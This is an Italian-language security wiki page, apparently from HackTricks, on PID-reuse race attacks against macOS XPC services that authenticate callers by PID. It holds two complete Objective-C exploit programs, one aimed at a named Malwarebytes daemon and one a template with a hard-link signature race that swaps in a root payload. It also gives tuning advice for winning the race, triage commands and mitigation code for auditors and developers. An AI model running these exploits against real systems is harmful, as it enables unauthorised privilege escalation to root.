# Riutilizzo dei PID su macOS

{{#include ../../../../../../banners/hacktricks-training.md}}

## Riutilizzo dei PID

Quando un **XPC service** di macOS autentica un chiamante risolvendo il suo **PID** invece di usare credenziali associate al messaggio ricevuto, potrebbe essere vulnerabile a un attacco di riutilizzo del PID. La primitive pratica non consiste nell'attendere il wraparound del namespace dei PID: l'attaccante invia una richiesta XPC e chiama immediatamente **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** con `POSIX_SPAWN_SETEXEC`, sostituendo l'immagine del processo dell'attaccante con un **allowed binary mantenendo il PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Se il server estrae dalla coda la richiesta e solo dopo risolve quel PID numerico in un processo attivo per effettuare controlli di code-signing, entitlement, percorso o processo padre, osserva il replacement binary invece del processo che ha inviato il messaggio. `POSIX_SPAWN_START_SUSPENDED` mantiene il trusted replacement attivo e stabile mentre il server esegue il controllo.<sup>[[1]](#references)[[2]](#references)</sup>

### Cosa viene effettivamente sottoposto a race

La sequenza vulnerabile è una **TOCTOU dell'identità del messaggio**, non semplicemente il fatto che “i PID possano ripetersi”:<sup>[[1]](#references)[[2]](#references)</sup>

1. Un processo dell'attaccante stabilisce o riprende una connessione XPC e accoda la richiesta privilegiata.
2. Prima che il servizio converta il PID della connessione in un `SecCodeRef` o in un altro oggetto di processo, l'attaccante sovrappone allo stesso processo un executable approvato usando `POSIX_SPAWN_SETEXEC`.
3. Il servizio convalida l'immagine approvata attualmente associata a quel PID, quindi esegue la richiesta già accodata e controllata dall'attaccante.

Qualsiasi bridge da PID presente in un authorization data flow è sospetto: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` o `audit_token_to_pid` seguiti da `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` o da un custom signature verifier. Un PID usato solo per il logging non è sufficiente; conferma che raggiunga la decisione allow/deny. Esamina anche gli error path: provare prima una ricerca tramite audit token ma **ripiegare sul PID in caso di errore** ripristina la stessa race. Questo fallback pattern è comparso in un'analisi del 2026 dei privileged XPC services di Intego.<sup>[[3]](#references)</sup>

### Triage statico e dinamico rapido

Inizia dall'handler della connessione e traccia ogni chiamata che produce un PID fino ai controlli di code-signing, entitlement, executable-path o version. Questi comandi forniscono una prima analisi rapida di un helper candidato; i binary stripped espongono ancora comunemente imported symbols, selector Objective-C o diagnostic strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Durante un test controllato, interrompi o fai hook sia sulla sorgente del PID sia sul suo verificatore. Un hit su `xpc_connection_get_pid` o `-processIdentifier` è solo un indizio; l'evidenza utile è una ricerca successiva dello **stesso intero** dopo che la richiesta è stata ricevuta. Frida può inoltre fare hook sul verificatore specifico dell'applicazione e sul selettore privilegiato per misurare se il selettore viene eseguito quando la race del PID ha successo.<sup>[[3]](#references)</sup>

### Esempio di exploit

Se trovi la funzione **`shouldAcceptNewConnection`** o una funzione chiamata da essa che **chiama** **`processIdentifier`** e non chiama **`auditToken`**, è molto probabile che stia **verificando il PID del processo** e non l'audit token.\
Come, ad esempio, in questa immagine (presa dal riferimento):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Controlla questo esempio di exploit (anch'esso preso dal riferimento) per vedere le 2 parti dell'exploit:<sup>[[1]](#references)</sup>

- Quello che **genera diversi fork**
- **Ogni fork** **invierà** il **payload** al servizio XPC eseguendo **`posix_spawn`** subito dopo l'invio del messaggio.

> [!CAUTION]
> Quando esegui una race con `fork()` da un processo Objective-C, avvia l'exploit con `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` esportato oppure includi il marker `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Prima opzione usando **`NSTasks`** e un argomento per avviare i processi figli e sfruttare la RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Questo esempio utilizza un **`fork`** raw per avviare **processi figli che sfrutteranno la race condition del PID** e poi sfruttare **un'altra race condition tramite un Hard link:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Rendere riproducibile la race

I seguenti punti di regolazione ricorrono negli exploit funzionanti basati sul riutilizzo del PID e nei recenti test degli helper privilegiati:<sup>[[1]](#references)[[3]](#references)</sup>

- Invia la richiesta e chiama immediatamente `posix_spawn`; **non** aspettare la risposta. La richiesta deve essere già accodata mentre la ricerca del PID da parte del server avviene dopo la sostituzione dell'immagine.
- Mantieni insieme `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED`. Il primo flag preserva il PID del processo coinvolto nella race; il secondo impedisce al target valido di terminare o cambiare stato prima della validazione.
- Usa diversi processi coinvolti nella race di breve durata e riprova l'intera sequenza di connessione/richiesta/exec. Il numero ottimale dipende dal target; un numero eccessivo di processi figli può rallentare il servizio e peggiorare la finestra temporale.
- La sostituzione deve soddisfare l'**intero** requisito del server. Quando possibile, riutilizza il binary del client legittimo e verifica prima il suo designated requirement con `codesign -d -r- "/path/to/client.app"`.
- Invoca prima un selector esportato innocuo o un metodo di sola lettura. Questo separa l'autenticazione riuscita dall'effettivo sfruttamento di una primitiva privilegiata successiva.

## Evitare il bridge del PID

Su macOS 13+, Foundation espone `-[NSXPCConnection setCodeSigningRequirement:]`. Imposta il requisito del peer esattamente una volta e **prima** di `resume`; stringhe di requisito malformate generano un'eccezione (o un fatal error in Swift), mentre un messaggio proveniente da un peer che non soddisfa il requisito invalida la connessione. In questo modo XPC può applicare l'identità del codice del peer senza che il codice dell'applicazione risolva un PID.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Per la modern low-level listener API su macOS 26+, `xpc_listener_set_peer_requirement` applica un `xpc_peer_requirement_t` convalidato mentre il listener è inattivo. XPC elimina le richieste che non lo soddisfano; le peer sessions create dal listener **non** lo ereditano, quindi applica anche un session requirement appropriato quando tali session autorizzano operazioni privilegiate.<sup>[[7]](#references)</sup>

> [!WARNING]
> Non cercare di “risolvere” il problema copiando un audit token e convertendolo nuovamente in un PID per la ricerca effettiva di `SecCode`. Mantieni l'identità derivata dall'audit token per tutta la decisione di autorizzazione oppure usa una XPC peer-requirement API dall'inizio alla fine.<sup>[[2]](#references)[[6]](#references)</sup> Le connection-wide audit-token API presentano inoltre una classe distinta di race, descritta in [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Altri esempi

- [**Intego X9: Perché il tuo antivirus macOS non dovrebbe fidarsi dei PID**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE contro l'helper privilegiato di un AV che autenticava i client tramite PID.<sup>[[3]](#references)</sup>
- [**Sfruttare il servizio XPC di GOG Galaxy per l'escalation dei privilegi in macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Parte II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Imparare lo sfruttamento di XPC - Parte 2: dire no al PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Non fidarti del PID! Storie di un semplice bug logico e dove trovarlo - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Perché il tuo antivirus macOS non dovrebbe fidarsi dei PID](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Sfruttare il servizio XPC di GOG Galaxy per l'escalation dei privilegi in macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Parte II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
